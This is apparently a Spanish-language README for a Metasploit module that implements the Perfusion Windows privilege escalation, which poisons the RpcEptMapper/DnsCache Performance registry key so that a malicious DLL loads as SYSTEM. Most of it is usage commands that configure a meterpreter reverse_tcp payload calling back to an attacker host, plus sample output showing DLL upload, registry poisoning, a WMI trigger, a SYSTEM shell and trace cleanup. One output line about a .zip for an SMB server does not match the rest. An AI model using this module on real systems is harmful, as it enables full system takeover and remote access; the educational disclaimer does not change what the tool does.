# Perfusion_msf - Metasploit Module

## Overview

Perfusion (itm4n) explota ACLs débiles en el registro de Windows (RpcEptMapper/DnsCache), permitiendo a usuarios sin privilegios inyectar una DLL maliciosa en la subclave Performance. El ataque se dispara mediante una consulta WMI a Win32_Perf, forzando al servicio a cargar la librería y ejecutar código como NT AUTHORITY\SYSTEM. 
Para ver una prueba de concepto te recomiendo visitar el siguiente link: [RetroTwo - HTB](https://securitylayer.gitbook.io/securitylayer/maquinas-y-modulos-de-htb/windows-easy/retrotwo).

## 📌 Instalación

Clonar el repositorio:

```bash
❯ git clone https://github.com/SecurityLayer404/perfusion_msf---Metasploit-Module.git
❯ cd perfusion_msf
```

Copiar el módulo al directorio de Metasploit:

```bash
❯ cp perfusion_msf.rb ~/.msf4/modules/exploits/windows/local/
```

Si el directorio no existe, crealo con:

```bash
❯ mkdir -p ~/.msf4/modules/exploits/windows/local/
```

Luego copiar nuevamente el módulo.

## 📌 Uso

Iniciar Metasploit y cargar el módulo:

```bash
❯ msfconsole -q
❯ use exploit/windows/local/perfusion_msf
```

Si el modulo cargo correctamente podras ver las opciones para configurar el exploit y si todavia no lo reconoce ejecuta el comando `reload_all` desde la consola de msf para actualizar la bbd:

```bash
❯ show options

Module options (exploit/windows/local/perfusion_msf):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   SESSION                          yes       The session to run this module on
   TARGET_SERVICE  RpcEptMapper     yes       The service vulnerable to exploitation (Accepted: RpcEptMapper, DnsCache)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.3      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x64
```

Configura el modulo y ejecuta:

```bash
❯ set session 1  # Reemplaza con la sesion rdp o winrm que tengas iniciada previamente en meterpreter

❯ set payload windows/x64/meterpreter/reverse_tcp  # Seleccionamos el payload 

❯ set lhost 0.0.0.0  # Reemplaza con tu IP atacante

❯ set lport 0000  # Reemplaza con el puerto que usaras para recibir la conexión

❯ exploit
```

Output: el módulo genera un archivo `.zip` que debe ser subido al servidor SMB objetivo para su posterior ejecución por parte de la víctima

```bash
[msf](Jobs:1 Agents:1) exploit(windows/local/perfusion_msf) >> exploit
[*] Started reverse TCP handler on 10.10.18.65:4455 
[*] Generando payload DLL para la arquitectura del objetivo...
[*] Subiendo DLL a C:\Users\LDAPRE~1\AppData\Local\Temp\2\RuhFpoXK.dll...
[*] Envenenando la clave del registro: HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance
[+] Disparando la consulta WMI para cargar la DLL como SYSTEM...
[*] Sending stage (232006 bytes) to 10.129.25.205
[!] Wmic generó un timeout, esto es normal si el payload capturó el hilo: Send timed out
[*] Limpiando rastros del registro y sistema de archivos...
[+] Deleted C:\Users\LDAPRE~1\AppData\Local\Temp\2\RuhFpoXK.dll
[*] Meterpreter session 2 opened (10.10.18.65:4455 -> 10.129.25.205:49249) at 2026-04-25 15:01:37 -0300

(Meterpreter 2)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
```

## ⚠️ Advertencia

Este módulo fue desarrollado con fines educativos y de pruebas autorizadas únicamente.
El uso no autorizado de este tipo de herramientas puede ser ilegal.

## 🕷 Adapted by

Security Layer